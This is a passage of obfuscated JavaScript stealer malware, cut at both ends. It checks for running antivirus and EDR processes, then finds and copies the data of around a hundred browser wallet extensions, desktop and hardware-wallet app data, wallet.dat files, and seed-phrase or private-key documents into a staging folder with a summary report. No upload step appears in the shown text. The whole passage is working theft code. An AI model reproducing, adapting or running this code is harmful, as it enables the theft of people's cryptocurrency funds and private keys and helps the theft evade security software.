        name: 'Cylance',
        processes: ['CylanceSvc.exe', 'CylanceUI.exe', 'CylancePROTECT.exe']
    }, {
        name: 'Darktrace',
        processes: ['dtagent.exe', 'dtui.exe', 'DarktraceSvc.exe']
    }, {
        name: 'FireEye',
        processes: ['xagt.exe', 'xagtnotif.exe', 'xagtnotif.exe']
    }, {
        name: 'Palo Alto',
        processes: ['PanGPS.exe', 'PanGPA.exe', 'PanMS.exe']
    }, {
        name: 'Proofpoint',
        processes: ['PPSX.exe', 'PPActiveDetection.exe', 'ProofpointTAP.exe']
    }, {
        name: 'Zscaler',
        processes: ['ZSATray.exe', 'ZSAgent.exe', 'Zscaler.exe']
    }, {
        name: 'Forcepoint',
        processes: ['fpavserver.exe', 'fpclient.exe', 'Forcepoint.exe']
    }, {
        name: 'Blue Coat',
        processes: ['bcs.exe', 'bcsservice.exe', 'BlueCoat.exe']
    }, {
        name: 'Websense',
        processes: ['websense.exe', 'wepsvc.exe', 'WebsenseControl.exe']
    }, {
        name: 'NetWitness',
        processes: ['nwsvc.exe', 'nwui.exe', 'NetWitness.exe']
    }, {
        name: 'RSA',
        processes: ['rsa.exe', 'rsaservice.exe', 'RSAArcher.exe']
    }, {
        name: 'Ad-Aware',
        processes: ['AdAwareService.exe', 'AdAwareTray.exe', 'AdAware.exe']
    }, {
        name: 'AhnLab',
        processes: ['V3Svc.exe', 'V3UI.exe', 'V3Medic.exe']
    }, {
        name: 'Arcabit',
        processes: ['Arcabit.exe', 'ArcaAV.exe', 'ArcabitSvc.exe']
    }, {
        name: 'Authentium',
        processes: ['Authentium.exe', 'CommandAntivirus.exe', 'AuthentiumSvc.exe']
    }, {
        name: 'Cat Quick Heal',
        processes: ['qhwatchdog.exe', 'qhconsol.exe', 'QUHLPSVC.EXE']
    }, {
        name: 'CMC',
        processes: ['CMC.exe', 'CMCSvc.exe', 'CMCAgent.exe']
    }, {
        name: 'eSafe',
        processes: ['eSafe.exe', 'eSafeSvc.exe', 'eSafeAgent.exe']
    }, {
        name: 'eTrust',
        processes: ['VetMsg.exe', 'VetTray.exe', 'eTrust.exe']
    }, {
        name: 'F-Prot',
        processes: ['FProtTray.exe', 'FProtSvc.exe', 'FProt.exe']
    }, {
        name: 'Grisoft',
        processes: ['avgcc.exe', 'avgw.exe', 'Grisoft.exe']
    }, {
        name: 'Hacksoft',
        processes: ['Hacksoft.exe', 'HacksoftSvc.exe', 'HacksoftAgent.exe']
    }, {
        name: 'Hauri',
        processes: ['Hauri.exe', 'HauriSvc.exe', 'HauriAgent.exe']
    }, {
        name: 'IKARUS',
        processes: ['IKARUS.exe', 'IKARUSSvc.exe', 'IKARUSAgent.exe']
    }, {
        name: 'Jetico',
        processes: ['Jetico.exe', 'JeticoSvc.exe', 'JeticoAgent.exe']
    }, {
        name: 'K7 Computing',
        processes: ['K7TSecurity.exe', 'K7TSMain.exe', 'K7TSAgent.exe']
    }, {
        name: 'Norman',
        processes: ['Norman.exe', 'NormanSvc.exe', 'NormanAgent.exe']
    }, {
        name: 'PC Tools',
        processes: ['PCTools.exe', 'PCToolsSvc.exe', 'PCToolsAgent.exe']
    }, {
        name: 'Prevx',
        processes: ['Prevx.exe', 'PrevxSvc.exe', 'PrevxAgent.exe']
    }, {
        name: 'Secure Computing',
        processes: ['SecureComputing.exe', 'SecureComputingSvc.exe', 'SecureComputingAgent.exe']
    }, {
        name: 'SecureWave',
        processes: ['SecureWave.exe', 'SecureWaveSvc.exe', 'SecureWaveAgent.exe']
    }, {
        name: 'Sunbelt',
        processes: ['Sunbelt.exe', 'SunbeltSvc.exe', 'SunbeltAgent.exe']
    }, {
        name: 'The Hacker',
        processes: ['TheHacker.exe', 'TheHackerSvc.exe', 'TheHackerAgent.exe']
    }, {
        name: 'UNA',
        processes: ['UNA.exe', 'UNASvc.exe', 'UNAAgent.exe']
    }, {
        name: 'VirusBuster',
        processes: ['VirusBuster.exe', 'VirusBusterSvc.exe', 'VirusBusterAgent.exe']
    }];
    try {
        const {
            stdout
        } = await execAsync('tasklist /FO CSV /NH');
        const lines = stdout.split("\n");
        const runningProcesses = new Set();
        for (const line of lines) {
            const parts = line.split(',');
            if (parts.length > 0) {
                const imageName = parts[0].replace(/"/g, '');
                runningProcesses.add(imageName.toLowerCase());
            }
        }
        for (const av of avList) {
            for (const proc of av.processes) {
                if (runningProcesses.has(proc.toLowerCase())) {
                    detected.push(av.name);
                    break;
                }
            }
        }
    } catch (e) {
    }
    return [...new Set(detected)];
}
async function xx2y3() {
    return;
}


const browserWalletPaths = {
    Chrome: {
        base: path.join(localappdata, 'Google', 'Chrome', 'User Data'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Binance Wallet': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'Exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
            'Atomic Wallet': 'fhilaheimglignddkjgofkcbgekhenbh',
            'Math Wallet': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'BitKeep': 'jiidiaalihmmhddjgbnbgdfflelocpak',
            'OKX Wallet': 'mcohilncbfahbmgdjkbpemcciiolgcge',
            'Rabby Wallet': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'XDEFI Wallet': 'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
            'SafePal': 'lgmpcpglpngdoalbgeoldeajfclnhafa',
            'Keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
            'Terra Station': 'aiifbnbfobpmeekipheeijimdpnlpgpp',
            'Nami': 'lpfcbjknijpeeillifnkikgncikgfhdo',
            'Eternl': 'kmhcihpebfmpgmihbkipmjlmmioameka',
            'Yoroi': 'ffnbelfdoeiohenkjibnmadjiehjhajb',
            'TronLink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
            'Ronin Wallet': 'fnjhmkhhmkbjkkabndcnnogagogbneec',
            'Liquality': 'kpfopkelmapcoipemfendmdcghnegimn',
            'Solflare': 'bhhhlbepdkbapadjdnnojkbgioiodbic',
            'Slope': 'pocmplpaccanhmnllbbkpgfliimjljgo',
            'Braavos': 'jnlgamecbpmbajjfhmmmlhejkemejdma',
            'Polymesh': 'jojhfeoedkpkglbfimdfabpdfjaoolaf',
            'ICONex': 'flpiciilemghbmfalicajoolhkkenfel',
            'Nabox': 'nknhiehlklippafakaeklbeglecifhad',
            'KardiaChain': 'pdadjkfkgcafgbceimcpbkalnfnepbnk',
            'Wombat': 'amkmjjmmflddogmhpjloimipbofnfjih',
            'MEW CX': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
            'Guarda': 'hpglfhgfnhbgpjdenjgmdgoeiappafln',
            'EVER Wallet': 'cgeeodpfagjceefieflmdfphplkenlfk',
            'Clover': 'nhnkbkgjikgcigadomkphalanndcapjk',
            'Leather (Hiro)': 'ldinpeekobnhjjdofggfgjlcehhmanlj',
            'Sui Wallet': 'opcgpfmipidbgpenhmajoajpbobppdil',
            'Petra Aptos': 'ejjladinnckdgjemekebdpeokbikhfci',
            'Martian Aptos': 'efbglgofoippbgcjepnhiblaibcnclgk',
            'Pontem Aptos': 'phkbamefinggmakgklpkljjmgibohnba',
            'Sender Wallet': 'epapihdplajcdnnkdeiahlgigofloibg',
            'Goby': 'jnkelfanjkeadonecabehalmbgpfodjm',
            'Leap Cosmos': 'fcfcfllfndlomdhbehjjcoimbgofdncg',
            'Core': 'agoakfejjabomempkjlepdflaleeobhb',
            'Harmony': 'fnnegphlobjdpkhecapkijjdkgcjhkib',
            'Enkrypt': 'kkpllkodjeloidieedojogacfhpaihoh',
            'Opera Wallet': 'nkddgncdjgjfcddamfgcmfnlhccnimig',
            'Rainbow': 'opfgelmcmbiajamepnmloijbpoleiama',
            'Zerion': 'klghhnkeealcohjjanjjdaeeggmfmlpl',
            'Talisman': 'fijngjgcjhjmmpcmkeiomlglpeiijkld',
            'Backpack': 'aflkmfhebedbjioipglgcbcmnbpgliof',
            'Fordefi': 'gnagcihlkglhdgaadhekmihmlnomkdei',
            'SubWallet': 'onhogfjeacnfoofkfgppdlbmlmnplgbn',
            'PolkadotJS': 'mopnmbcafieddcagagdcbnhejhlodfdd',
            'Compass': 'anokgmphncpekkhclmingpimjmcooifb',
            'OWallet': 'hhejbopdnpbjgomhpmegemnjdwerdhhl',
            'Cosmostation': 'fpkhgmpbidmiogeglndfbkegfdlnajnf',
            'Frontier': 'kppfdiipphfccemcignhifpjkapfbihd',
            'Bifrost': 'gfbapjadghcjbjbimlgpnkjomgkkidlg',
            'Frame': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Noone': 'mjhibnmklpkhdfmhpgmihcikaclklkdb',
            'Temple': 'ookjlbkiijinhpmnjffcofjonbfbgaoc',
            'Beacon': 'gpfndedineagiepkpinficbcbbgjoenn',
            'Kukai': 'dhoiejdeibakejckcmgdcbakjdjoklco',
            'Spire': 'gpaigehiakghopkbbgpolppmojpckklm',
            'Umami': 'bkdaaifcdibjmbknjcmbagpepkbhfjhg',
            'Cyano': 'dkdedlpgdmmkkfjabffeganieamfklkm',
            'OneKey': 'jnmbobjmhlngoefaiojfljckilhhlhcj',
            'Safepal Extension': 'lgmpcpglpngdoalbgeoldeajfclnhafa',
            'Slope Finance': 'pocmplpaccanhmnllbbkpgfliimjljgo',
            'Coin98': 'aeachknmefphepccionboohckonoeemg',
            'TokenPocket': 'mfgccjchihfkkindfppnaooecgfneiii',
            'ioPay': 'ilgbfbicnkangdlofblackcoignjacni',
            'Auro': 'cnmamaachppnkjgnildpdlbmlmnplgbn',
            'Leafkey': 'bhmejakjdfmhfobdamfbpeocicjdajij',
            'OneKey (Legacy)': 'infeboajgfhgbjpjbeppbkgnabfdkdaf',
            'Nifty': 'jbdaocneiiinmjbjlgalhcelgbejmnid',
            'BoltX': 'aodkkagnadcbobfpggfnjeongemjbjca',
            'Liquality Wallet': 'kpfopkelmapcoipemfendmdcghnegimn',
            'Saturn': 'nkddgncdjgjfcddamfgcmfnlhccnimig',
            'Guild': 'nanjmdknhkinifnkgdcggcfnhdaammmj',
            'Taho (Tally Ho)': 'eajafomhmkipbjmfmhebemolkcicgfmd',
            'Xverse': 'idnnbdplmphpflfnlkomgpfbpcgelopg',
            'DeFi Wallet': 'klhkobkdpphfpioepbgjhdeomkdafgme',
            'Avail': 'kkpllkodjeloidieedojogacfhpaihoh',
            'MewCx': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
            'Casper Signer': 'djhndpllfiibmcdbnmaaahkhchcoijce',
            'Subwallet Polkadot': 'onhogfjeacnfoofkfgppdlbmlmnplgbn',
            'Finnie': 'cjmkndjhnagcfbpiemnkdpomccnjblmj',
            'Stargazer': 'pgiaagfkgcbnmiiolekcfmljdagdhlcm',
            'Polymesh Wallet': 'jojhfeoedkpkglbfimdfabpdfjaoolaf',
            'Martian Wallet': 'efbglgofoippbgcjepnhiblaibcnclgk',
            'Maiar DeFi': 'dngmlblcodfobpdpecaadgfbcggfjfnm',
            'Flint Wallet': 'hnhobjmcibchnmglfbldbfabcgaknlkj',
            'Sender': 'epapihdplajcdnnkdeiahlgigofloibg',
            'Brave Wallet': 'odbfpeeihdkbihmopkbjmoonfanlbfcl'
        }
    },
    Edge: {
        base: path.join(localappdata, 'Microsoft', 'Edge', 'User Data'),
        wallets: {
            'MetaMask': 'ejbalbakoplchlghecdalmeeeajnimhm',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Binance Wallet': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph'
        }
    },
    Brave: {
        base: path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    },
    Opera: {
        base: path.join(appData, 'Opera Software', 'Opera Stable'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }
    },
    OperaGX: {
        base: path.join(appData, 'Opera Software', 'Opera GX Stable'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }
    }
};
const desktopWalletPaths = {
    'Exodus': path.join(appData, 'Exodus', 'exodus.wallet'),
    'Atomic': path.join(appData, 'atomic', 'Local Storage', 'leveldb'),
    'Electrum': path.join(appData, 'Electrum', 'wallets'),
    'Ethereum': path.join(appData, 'Ethereum', 'keystore'),
    'Monero': path.join(appData, 'Monero'),
    'Bytecoin': path.join(appData, 'bytecoin'),
    'Jaxx Liberty': path.join(appData, 'com.liberty.jaxx', 'IndexedDB'),
    'Zcash': path.join(appData, 'Zcash'),
    'Armory': path.join(appData, 'Armory'),
    'Coinomi': path.join(localappdata, 'Coinomi', 'Coinomi', 'wallets'),
    'Guarda': path.join(appData, 'Guarda'),
    'Wasabi': path.join(appData, 'WalletWasabi', 'Client', 'Wallets'),
    'Bitcoin Core': path.join(appData, 'Bitcoin', 'wallets'),
    'Bitcoin': path.join(appData, 'Bitcoin'),
    'Litecoin': path.join(appData, 'Litecoin'),
    'Litecoin Core': path.join(appData, 'Litecoin', 'wallets'),
    'Dash Core': path.join(appData, 'DashCore', 'wallets'),
    'Dash': path.join(appData, 'DashCore'),
    'Dogecoin': path.join(appData, 'Dogecoin'),
    'Dogecoin Core': path.join(appData, 'Dogecoin', 'wallets'),
    'Daedalus': path.join(appData, 'Daedalus', 'wallets'),
    'Yoroi': path.join(appData, 'Yoroi'),
    'Nami': path.join(appData, 'Nami'),
    'Eternl': path.join(appData, 'eternl'),
    'MultiBit': path.join(appData, 'MultiBit'),
    'Binance': path.join(appData, 'Binance'),
    'com.liberty.jaxx': path.join(appData, 'com.liberty.jaxx', 'IndexedDB', 'file__0.indexeddb.leveldb')
};
const coldWalletPaths = {
    'Ledger Live': path.join(appData, 'Ledger Live'),
    'Ledger': path.join(appData, 'Ledger Live', 'Local Storage', 'leveldb'),
    'Trezor Suite': path.join(appData, 'Trezor Suite'),
    'Trezor': path.join(appData, 'Trezor Suite', 'IndexedDB'),
    'KeepKey': path.join(appData, 'KeepKey'),
    'BitBox': path.join(appData, 'BitBox')
};
async function xz4a5() {
    const extractedWallets = [];
    for (const [browserName, browserConfig] of Object.entries(browserWalletPaths)) {
        if (!fs.existsSync(browserConfig.base)) {
            continue;
        }
        const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];
        for (const profile of profiles) {
            const profilePath = path.join(browserConfig.base, profile);
            if (!fs.existsSync(profilePath)) {
                continue;
            }
            const extensionsPath = path.join(profilePath, 'Local Extension Settings');
            if (!fs.existsSync(extensionsPath)) {
                continue;
            }
            for (const [walletName, extensionId] of Object.entries(browserConfig.wallets)) {
                const walletPath = path.join(extensionsPath, extensionId);
                if (fs.existsSync(walletPath)) {
                    try {
                        const walletInfo = {
                            browser: browserName,
                            profile: profile,
                            wallet: walletName,
                            extensionId: extensionId,
                            path: walletPath,
                            files: []
                        };
                        const files = fs.readdirSync(walletPath);
                        for (const file of files) {
                            const filePath = path.join(walletPath, file);
                            const stat = fs.statSync(filePath);
                            if (stat.isFile()) {
                                walletInfo.files.push({
                                    name: file,
                                    size: stat.size,
                                    path: filePath
                                });
                            }
                        }
                        extractedWallets.push(walletInfo);
                    } catch (error) {
                    }
                }
            }
        }
    }
    return extractedWallets;
}
async function xb6c7(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Browser_Wallets');
    fs.mkdirSync(walletsDir, {
        recursive: true
    });
    for (const wallet of wallets) {
        const walletOutputDir = path.join(walletsDir, `${wallet.browser}_${wallet.profile}_${wallet.wallet}`.replace(/[<>:"/\\|?*]/g, '_'));
        fs.mkdirSync(walletOutputDir, {
            recursive: true
        });
        fs.writeFileSync(path.join(walletOutputDir, 'info.json'), JSON.stringify(wallet, null, 2), 'utf8');
        let totalSize = 0;
        for (const file of wallet.files) {
            try {
                if (file.size > 5242880) {
                    continue;
                }
                if (totalSize + file.size > 20971520) {
                    break;
                }
                const destPath = path.join(walletOutputDir, file.name);
                fs.copyFileSync(file.path, destPath);
                totalSize += file.size;
            } catch (error) {
            }
        }
    }
    return walletsDir;
}
async function xd8e9() {
    const extractedWallets = [];
    for (const [walletName, walletPath] of Object.entries(desktopWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stat = fs.statSync(walletPath);
                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stat.isDirectory() ? 'directory' : 'file',
                    size: stat.isFile() ? stat.size : null,
                    files: []
                };
                if (stat.isDirectory()) {
                    const files = xt4u5(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(f => {
                        try {
                            return {
                                name: path.relative(walletPath, f),
                                path: f,
                                size: fs.statSync(f).size
                            };
                        } catch (e) {
                            return null;
                        }
                    }).filter(f => f !== null);
                }
                extractedWallets.push(walletInfo);
            } catch (error) {
            }
        }
    }
    return extractedWallets;
}
async function xf0g1(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Desktop_Wallets');
    fs.mkdirSync(walletsDir, {
        recursive: true
    });
    for (const wallet of wallets) {
        const walletOutputDir = path.join(walletsDir, wallet.name.replace(/[<>:"/\\|?*]/g, '_'));
        fs.mkdirSync(walletOutputDir, {
            recursive: true
        });
        fs.writeFileSync(path.join(walletOutputDir, 'info.json'), JSON.stringify(wallet, null, 2), 'utf8');
        if (wallet.type === 'directory') {
            const filesToCopy = wallet.files.slice(0, 70);
            for (const file of filesToCopy) {
                try {
                    const relativePath = file.name;
                    const destPath = path.join(walletOutputDir, relativePath);
                    const destDir = path.dirname(destPath);
                    fs.mkdirSync(destDir, {
                        recursive: true
                    });
                    if (file.size < 10485760) {
                        fs.copyFileSync(file.path, destPath);
                    }
                } catch (error) {
                }
            }
        } else {
            try {
                const destPath = path.join(walletOutputDir, path.basename(wallet.path));
                fs.copyFileSync(wallet.path, destPath);
            } catch (error) {
            }
        }
    }
    return walletsDir;
}
async function xh2i3() {
    const extractedWallets = [];
    for (const [walletName, walletPath] of Object.entries(coldWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stat = fs.statSync(walletPath);
                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stat.isDirectory() ? 'directory' : 'file',
                    files: []
                };
                if (stat.isDirectory()) {
                    const files = xt4u5(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(f => {
                        try {
                            return {
                                name: path.relative(walletPath, f),
                                path: f,
                                size: fs.statSync(f).size
                            };
                        } catch (e) {
                            return null;
                        }
                    }).filter(f => f !== null);
                }
                extractedWallets.push(walletInfo);
            } catch (error) {
            }
        }
    }
    return extractedWallets;
}
async function xj4k5(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Cold_Wallets');
    fs.mkdirSync(walletsDir, {
        recursive: true
    });
    for (const wallet of wallets) {
        const walletOutputDir = path.join(walletsDir, wallet.name.replace(/[<>:"/\\|?*]/g, '_'));
        fs.mkdirSync(walletOutputDir, {
            recursive: true
        });
        fs.writeFileSync(path.join(walletOutputDir, 'info.json'), JSON.stringify(wallet, null, 2), 'utf8');
        if (wallet.type === 'directory') {
            const filesToCopy = wallet.files.slice(0, 50);
            for (const file of filesToCopy) {
                try {
                    const relativePath = file.name;
                    const destPath = path.join(walletOutputDir, relativePath);
                    const destDir = path.dirname(destPath);
                    fs.mkdirSync(destDir, {
                        recursive: true
                    });
                    if (file.size < 10485760) {
                        fs.copyFileSync(file.path, destPath);
                    }
                } catch (error) {
                }
            }
        }
    }
    return walletsDir;
}
async function xl6m7() {
    const walletFiles = [];
    const searchPaths = [path.join(appData, 'Bitcoin'), path.join(appData, 'Litecoin'), path.join(appData, 'Dogecoin'), path.join(appData, 'DashCore'), path.join(appData, 'Ethereum'), path.join(appData, 'Monero')];
    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) {
            continue;
        }
        try {
            const files = xt4u5(searchPath, 'wallet.dat', [], 0, 2);
            for (const file of files) {
                try {
                    const stat = fs.statSync(file);
                    walletFiles.push({
                        path: file,
                        size: stat.size,
                        modified: stat.mtime
                    });
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }
    return walletFiles;
}
async function xn8o9(walletFiles, outputDir) {
    const walletDatDir = path.join(outputDir, 'WalletDat_Files');
    fs.mkdirSync(walletDatDir, {
        recursive: true
    });
    for (let i = 0; i < walletFiles.length; i++) {
        const wallet = walletFiles[i];
        const destPath = path.join(walletDatDir, `wallet_${i + 1}_${path.basename(path.dirname(wallet.path))}.dat`);
        try {
            fs.copyFileSync(wallet.path, destPath);
        } catch (error) {
        }
    }
    return walletDatDir;
}
async function xp0q1() {
    const seedFiles = [];
    const searchPaths = [path.join(os.homedir(), 'Desktop'), path.join(os.homedir(), 'Documents')];
    const seedPatterns = [/seed/i, /mnemonic/i, /recovery.*phrase/i, /private.*key/i, /wallet.*backup/i, /crypto.*backup/i];
    const skipPatterns = [/discord/i, /backup.*codes/i];
    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) {
            continue;
        }
        try {
            const files = xt4u5(searchPath, null, [], 0, 1).filter(file => {
                const ext = path.extname(file).toLowerCase();
                return ext === '.txt' || ext === '.doc' || ext === '.docx';
            });
            for (const file of files) {
                const fileName = path.basename(file).toLowerCase();
                if (skipPatterns.some(pattern => pattern.test(fileName))) {
                    continue;
                }
                if (seedPatterns.some(pattern => pattern.test(fileName))) {
                    try {
                        const stat = fs.statSync(file);
                        if (stat.size < 1048576) {
                            seedFiles.push({
                                path: file,
                                size: stat.size,
                                name: path.basename(file)
                            });
                        }
                    } catch (e) {
                    }
                }
            }
        } catch (error) {
        }
    }
    return seedFiles;
}
async function xr2s3(seedFiles, outputDir) {
    const seedDir = path.join(outputDir, 'Seed_Phrases');
    fs.mkdirSync(seedDir, {
        recursive: true
    });
    for (const file of seedFiles) {
        try {
            const destPath = path.join(seedDir, file.name);
            fs.copyFileSync(file.path, destPath);
        } catch (error) {
        }
    }
    return seedDir;
}
function xt4u5(dir, targetFileName = null, fileList = [], depth = 0, maxDepth = 3) {
    if (depth > maxDepth) {
        return fileList;
    }
    try {
        const files = fs.readdirSync(dir);
        for (const file of files) {
            if (file === 'node_modules' || file === '.git' || file === 'cache' || file === 'Cache') {
                continue;
            }
            const filePath = path.join(dir, file);
            try {
                const stat = fs.statSync(filePath);
                if (stat.isDirectory()) {
                    xt4u5(filePath, targetFileName, fileList, depth + 1, maxDepth);
                } else {
                    if (!targetFileName || file.toLowerCase() === targetFileName.toLowerCase()) {
                        fileList.push(filePath);
                    }
                }
            } catch (error) {
            }
        }
    } catch (error) {
    }
    return fileList;
}
function xv6w7(results) {
    let text = "xd - WALLET SUMMARY\n";
    text += '='.repeat(50) + "\n\n";
    text += `Generated: ${results.timestamp.toISOString()}\n\n`;
    if (results.browserWallets.length > 0) {
        text += `BROWSER WALLETS (${results.browserWallets.length})\n`;
        text += '-'.repeat(30) + "\n";
        results.browserWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.wallet} (${wallet.browser} - ${wallet.profile})\n`;
            text += `   Extension: ${wallet.extensionId}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += "\n";
        });
    }
    if (results.desktopWallets.length > 0) {
        text += `DESKTOP WALLETS (${results.desktopWallets.length})\n`;
        text += '-'.repeat(30) + "\n";
        results.desktopWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.name}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += "\n";
        });
    }
    if (results.coldWallets.length > 0) {
        text += `COLD WALLETS (${results.coldWallets.length})\n`;
        text += '-'.repeat(30) + "\n";
        results.coldWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.name}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += "\n";
        });
    }
    if (results.walletDatFiles.length > 0) {
        text += `WALLET.DAT FILES (${results.walletDatFiles.length})\n`;
        text += '-'.repeat(30) + "\n";
        results.walletDatFiles.forEach((file, index) => {
            text += `${index + 1}. ${file.name}\n`;
            text += `   Path: ${file.path}\n`;
            text += `   Size: ${(file.size / 1024 / 1024).toFixed(1)} MB\n\n`;
        });
    }
    if (results.seedFiles.length > 0) {
        text += `SEED PHRASES (${results.seedFiles.length})\n`;
        text += '-'.repeat(30) + "\n";
        results.seedFiles.forEach((file, index) => {
            text += `${index + 1}. ${file.name}\n`;
            text += `   Path: ${file.path}\n`;
            text += `   Size: ${(file.size / 1024).toFixed(1)} KB\n\n`;
        });
    }
    const totalWallets = results.browserWallets.length + results.desktopWallets.length + results.coldWallets.length + results.walletDatFiles.length + results.seedFiles.length;
    text += "SUMMARY\n";
    text += '-'.repeat(30) + "\n";
    text += `Total Wallets Found: ${totalWallets}\n`;
    text += `Browser Wallets: ${results.browserWallets.length}\n`;
    text += `Desktop Wallets: ${results.desktopWallets.length}\n`;
    text += `Cold Wallets: ${results.coldWallets.length}\n`;
    text += `Wallet.dat Files: ${results.walletDatFiles.length}\n`;
    text += `Seed Files: ${results.seedFiles.length}\n`;
    return text;
}
const Priv_WALLET_PATHS = {
    exodus: {
        path: path.join(process.env.APPDATA || '', 'Exodus', 'exodus.wallet'),
        files: ['*']
    },
    atomic: {
        path: path.join(process.env.APPDATA || '', 'atomic', 'Local Storage', 'leveldb'),
        files: ['*']
    },
    electrum: {
        path: path.join(process.env.APPDATA || '', 'Electrum', 'wallets'),
        files: ['*']
    },
    jaxx: {
        path: path.join(process.env.APPDATA || '', 'com.liberty.jaxx', 'IndexedDB'),
        files: ['*']
    },
    coinomi: {
        path: path.join(process.env.LOCALAPPDATA || '', 'Coinomi', 'Coinomi', 'wallets'),
        files: ['*']
    },
    guarda: {
        path: path.join(process.env.APPDATA || '', 'Guarda', 'Local Storage', 'leveldb'),
        files: ['*']
    },
    metamask: {
        browserExtension: true,
        extensionId: 'nkbihfbeogaeaoehlefnkodbefgpgknn'
    },
    phantom: {
        browserExtension: true,
        extensionId: 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
    },
    ronin: {
        browserExtension: true,
        extensionId: 'fnjhmkhhmkbjkkabndcnnogagogbneec'
    },
    binance: {
        browserExtension: true,
        extensionId: 'fhbohimaelbohpjbbldcngcnapndodjp'
    },
    coinbase: {
        browserExtension: true,
        extensionId: 'hnfanknocfeofbddgcijnmhnfnkdnaad'
    }
};
const Priv_BROWSER_PATHS = {
    chrome: path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings'),
    brave: path.join(process.env.LOCALAPPDATA || '', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings'),
    edge: path.join(process.env.LOCALAPPDATA || '', 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings'),
    opera: path.join(process.env.APPDATA || '', 'Opera Software', 'Opera Stable', 'Local Extension Settings')
};
async function xx8y9(outputDir) {
    const PrivDir = path.join(outputDir, 'Priv_Wallets');
    if (!fs.existsSync(PrivDir)) {
        fs.mkdirSync(PrivDir, {
            recursive: true
        });
    }

    const copyDir = (src, dest) => {
        try {
            if (!fs.existsSync(src)) {
                return;
            }
            if (!fs.existsSync(dest)) {
                fs.mkdirSync(dest, {
                    recursive: true
                });
            }
            const items = fs.readdirSync(src);
            for (const item of items) {
                const srcPath = path.join(src, item);
                const destPath = path.join(dest, item);
                try {
                    const stat = fs.statSync(srcPath);
                    if (stat.isDirectory()) {
                        copyDir(srcPath, destPath);
                    } else {
                        fs.copyFileSync(srcPath, destPath);
                    }
                } catch (e) { }
            }
        } catch (e) { }
    };

    for (const [walletName, config] of Object.entries(Priv_WALLET_PATHS)) {
        if (config.browserExtension) {
            continue;
        }
        try {
            if (fs.existsSync(config.path)) {
                const destPath = path.join(PrivDir, 'Desktop', walletName);
                copyDir(config.path, destPath);
            }
        } catch (e) { }
    }

    for (const [walletName, config] of Object.entries(Priv_WALLET_PATHS)) {
        if (!config.browserExtension) {
            continue;
        }
        for (const [browserName, basePath] of Object.entries(Priv_BROWSER_PATHS)) {
            try {
                const extensionPath = path.join(basePath, config.extensionId);
                if (fs.existsSync(extensionPath)) {
                    const destPath = path.join(PrivDir, 'Extensions', browserName, walletName);
                    copyDir(extensionPath, destPath);
                }
            } catch (e) { }
        }
    }
    return PrivDir;
}
async function xz0a1(outputDir) {
    try {
        await xx8y9(outputDir);
        console.log('[Priv] Priv Wallets collected');
    } catch (e) {
        console.log('[Priv] Priv Wallet Collection failed:', e.message);
    }
    const results = {
        browserWallets: [],
        desktopWallets: [],
        coldWallets: [],
        walletDatFiles: [],
        seedFiles: [],
        timestamp: new Date()
